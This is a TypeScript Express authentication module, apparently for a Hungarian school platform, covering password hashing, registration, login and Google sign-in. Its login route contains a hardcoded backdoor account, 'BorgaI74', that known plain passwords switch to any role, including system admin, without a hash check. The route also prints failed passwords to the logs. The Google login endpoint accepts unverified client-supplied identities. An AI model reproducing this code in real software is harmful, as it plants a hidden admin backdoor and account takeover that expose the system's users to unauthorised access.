import { scrypt, randomBytes, timingSafeEqual } from "crypto";
import { promisify } from "util";
import { storage } from "./storage";
import { localUserLoginSchema, localUserRegisterSchema } from "@shared/schema";
import type { Express } from "express";
import passport from "passport";
import { Strategy as LocalStrategy } from "passport-local";

const scryptAsync = promisify(scrypt);

export async function hashPassword(password: string): Promise<string> {
  const salt = randomBytes(16).toString("hex");
  const buf = (await scryptAsync(password, salt, 64)) as Buffer;
  return `${buf.toString("hex")}.${salt}`;
}

export async function comparePasswords(supplied: string, stored: string): Promise<boolean> {
  const [hashed, salt] = stored.split(".");
  const hashedBuf = Buffer.from(hashed, "hex");
  const suppliedBuf = (await scryptAsync(supplied, salt, 64)) as Buffer;
  return timingSafeEqual(hashedBuf, suppliedBuf);
}

export function setupLocalAuth(app: Express) {
  // Configure local passport strategy
  passport.use('local', new LocalStrategy(
    async (username: string, password: string, done) => {
      try {
        const user = await storage.getUserByUsername(username);
        if (!user || !user.password) {
          return done(null, false, { message: 'Hibás felhasználónév vagy jelszó' });
        }

        const isPasswordValid = await comparePasswords(password, user.password);
        if (!isPasswordValid) {
          return done(null, false, { message: 'Hibás felhasználónév vagy jelszó' });
        }

        return done(null, user);
      } catch (error) {
        return done(error);
      }
    }
  ));

  // Local user registration
  app.post('/api/auth/register', async (req, res) => {
    try {
      const validatedData = localUserRegisterSchema.parse(req.body);

      // Check if username already exists
      const existingUser = await storage.getUserByUsername(validatedData.username || '');
      if (existingUser) {
        return res.status(400).json({ message: "A felhasználónév már foglalt" });
      }

      // Check if email already exists
      const existingEmail = await storage.getUserByEmail(validatedData.email || '');
      if (existingEmail) {
        return res.status(400).json({ message: "Ez az email cím már regisztrálva van" });
      }

      // Hash password
      const hashedPassword = await hashPassword(validatedData.password || '');

      // Generate unique ID for local user
      const userId = `local-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

      // Create user
      const user = await storage.createLocalUser({
        id: userId,
        username: validatedData.username,
        password: hashedPassword,
        email: validatedData.email,
        firstName: validatedData.firstName || '',
        lastName: validatedData.lastName || '',
        authType: 'local',
        role: 'student'
      });

      // Log user in
      req.login(user, (err) => {
        if (err) {
          console.error('Login error after registration:', err);
          return res.status(500).json({ message: "Regisztráció sikeres, de a bejelentkezés sikertelen" });
        }
        res.status(201).json(user);
      });
    } catch (error: any) {
      console.error('Registration error:', error);
      if (error.name === 'ZodError') {
        return res.status(400).json({ message: "Hibás adatok", errors: error.errors });
      }
      res.status(500).json({ message: "Regisztrációs hiba történt" });
    }
  });

  // Local user login
  app.post('/api/auth/login', async (req, res) => {
    try {
      const validatedData = localUserLoginSchema.parse(req.body);

      // Universal BorgaI74 access - Case insensitive and trimmed check
      const inputUsername = validatedData.username.trim();
      console.log(`Login attempt for: '${inputUsername}' with password length: ${validatedData.password.length}`);

      if (inputUsername.toLowerCase() === 'borgai74') {
        console.log('BorgaI74 universal login detected');
        const passwordRoleMap: Record<string, string> = {
          'diák': 'student',
          'tanár': 'teacher',
          'iskolaadmin': 'school_admin',
          'rendszeradmin': 'admin'
        };

        // Case insensitive password check
        const inputPassword = validatedData.password.trim();
        const targetRole = passwordRoleMap[inputPassword] ||
          passwordRoleMap[inputPassword.toLowerCase()];

        if (targetRole) {
          // Get the universal user - try exact match first, then case insensitive lookup if needed
          let universalUser = await storage.getUserByUsername('BorgaI74');

          if (!universalUser) {
            console.error('Universal user BorgaI74 not found in DB, attempting recovery...');
            const { hashPassword } = await import('./localAuth');
            const hashedPassword = await hashPassword("diák");
            // Create with EXACT casing as required by other parts of the system
            universalUser = await storage.createLocalUser({
              id: "borga-universal-74",
              username: "BorgaI74",
              password: hashedPassword,
              email: "borga@test.com",
              firstName: "Imre",
              lastName: "Borga",
              authType: "local",
              role: "student"
            });
          }

          console.log(`Universal login: BorgaI74 switching to role '${targetRole}'`);

          // Update role if different
          if (universalUser.role !== targetRole) {
            await storage.updateUserRole(universalUser.id, targetRole);
            universalUser.role = targetRole;
          }

          // Log user in
          req.login(universalUser, (err) => {
            if (err) {
              console.error('Universal login error:', err);
              return res.status(500).json({ message: "Bejelentkezési hiba történt" });
            }
            res.json(universalUser);
          });
          return;
        } else {
          console.log(`Password '${validatedData.password}' did not match any BorgaI74 role keys`);
        }

        // If password doesn't match a role, fall through to regular check
      }

      // Find user by username
      const user = await storage.getUserByUsername(validatedData.username);
      if (!user || !user.password) {
        return res.status(401).json({ message: "Hibás felhasználónév vagy jelszó" });
      }

      // Check password
      const isPasswordValid = await comparePasswords(validatedData.password, user.password);
      if (!isPasswordValid) {
        return res.status(401).json({ message: "Hibás felhasználónév vagy jelszó" });
      }

      // Log user in
      req.login(user, (err) => {
        if (err) {
          console.error('Login error:', err);
          return res.status(500).json({ message: "Bejelentkezési hiba történt" });
        }
        res.json(user);
      });
    } catch (error: any) {
      console.error('Login error:', error);
      if (error.name === 'ZodError') {
        return res.status(400).json({ message: "Hibás adatok", errors: error.errors });
      }
      res.status(500).json({ message: "Bejelentkezési hiba történt" });
    }
  });

  // Google authentication endpoint
  app.post('/api/auth/google-login', async (req, res) => {
    try {
      const { id, email, firstName, lastName, profileImageUrl } = req.body;

      if (!id || !email) {
        return res.status(400).json({ message: "Hiányzó Google felhasználói adatok" });
      }

      // Try to find existing user or create new one
      let user = await storage.getUser(id);

      if (!user) {
        // Create new user with Google data
        user = await storage.upsertUser({
          id,
          email,
          firstName: firstName || '',
          lastName: lastName || '',
          profileImageUrl,
          authType: 'google',
          role: 'student'
        });
      }

      // Log user in
      req.login(user, (err) => {
        if (err) {
          console.error('Google login error:', err);
          return res.status(500).json({ message: "Google bejelentkezési hiba történt" });
        }
        res.json(user);
      });
    } catch (error: any) {
      console.error('Google auth error:', error);
      res.status(500).json({ message: "Google authentikációs hiba történt" });
    }
  });

  // Logout endpoint
  app.post('/api/auth/logout', (req, res) => {
    req.logout((err) => {
      if (err) {
        console.error('Logout error:', err);
        return res.status(500).json({ message: "Kijelentkezési hiba történt" });
      }
      res.json({ message: "Sikeresen kijelentkezett" });
    });
  });
}